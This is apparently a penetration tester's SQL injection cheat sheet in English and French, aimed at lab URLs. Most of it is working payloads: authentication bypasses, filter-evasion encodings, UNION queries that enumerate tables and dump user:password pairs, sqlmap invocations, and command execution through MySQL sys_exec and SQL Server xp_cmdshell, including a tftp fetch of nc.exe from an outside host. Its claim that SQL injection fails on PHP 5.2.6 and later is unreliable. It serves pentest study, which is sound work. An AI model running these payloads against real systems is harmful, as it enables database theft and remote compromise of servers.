# SQLi : SQL Injection


````sql
SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
````
- Close the string : ' "
- Widen the request : or 1=1
- Add inputs with UNION
- Comment end of request : -- #

````
http://12.0.0.11/sqli/example1.php?name=root' or '1'='1
http://12.0.0.11/sqli/example1.php?name=root' or '1'=1
http://12.0.0.11/sqli/example1.php?name=root’ or 1=1-- -
http://12.0.0.11/sqli/example1.php?name=root%27%20or%20%271%27=%271
````

## SqlMap

Url: http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/
````
http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -

sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner
````

## Avoid simple filters
### Limit returned results
````
a' or 1=1 LIMIT 1 #
````

Replace Space by Tab %09 
````
username=admin%27%09or%091%3D1%09--%09&password=admin
````

Bypass php function ‘addslashes’ used to insert strings in mysql requests
Use Chinese charset %bf%27  to set a ' in proxy
````
username=a%bf%27+or+1=1+#&password=b
````

Filter sur AND ou OR, les remplacer par
````
AND :   &&   %26%26 
OR  :  || 
````
Filtrage sur les Espaces -> newlines %A0, utiliser des \t TAB %90 , utiliser /**/
````
http://12.0.0.11/sqli/example2.php?name=root%27%A0or%A01=1--%A0-
````
Filter with : mysql_real_escape_string
````
$iId = mysql_real_escape_string("1 OR 1=1");
http://12.0.0.11/sqli/example4.php?id=2 OR  1=1
````

### Note: PHP <=5.2.6
SQL Injection won't work on PHP >= v5.2.6.
Unless php tuned for
````
<IfModule mod_php5.c>
    magic_quotes_gpc = Off
    allow_url_fopen = On
    allow_url_include = On
</IfModule>
````

### Identify number of fields in select

```
id=engineer order by 10-- throws an error
id=engineer order by 9-- throws an error
id=engineer order by 4-- ok => 4 field

UNION SELECT 1,2,3,4
```


### Use Union
````
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2
http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2,3,4
````
Identify number of fields in select: here 1,2,3,4 doesn’t generate error


### Get table names

```
name=a&pass=admin' or 1=1 UNION SELECT 1,2
name=a&pass=admin' or 1=1 UNION SELECT table_name,table_name FROM information_schema.tables; -- -  
```


### Get table column names


```
name=a&pass=admin' or 1=1 UNION SELECT column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -

```

### dump table 
```
name=a&pass=admin' or 1=1 UNION SELECT concat(name,':',pass),1 FROM users; -- -
```


### Dump des users de mysql

```
name=a&pass=admin' or 1=1 UNION SELECT concat(User,':',Password),1 FROM user; -- -
Internal Serever Error: Pas le droit..
```

#### Escape cotes

hex-encoded value of “secret” better than messing with quotes. : table_schema='secret' => table_schema=0x736563726574

```
id=engineer union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574 --
```


## MySql

````
select sys_exec('/bin/sh');
after bash access, “bash –p” or “sudo su”
````

##  SQL Server 

Connect to:
````
sqsh -S hostname -Uusername -Ppassword
use database;
go
select * from tblTable;
go
````

If xp_cmdshell is enabled
````
exec master..xp_cmdshell 'type c:\"Documents and Settings"\Administrator\Desktop\proof.txt'
go
EXEC master..xp_cmdshell 'tftp -i 192.168.168.168 GET nc.exe'
go
````



## SQLMap


Copy Burp request : search-test.txt
```
./sqlmap.py -r search-test.txt -p tfUPass

```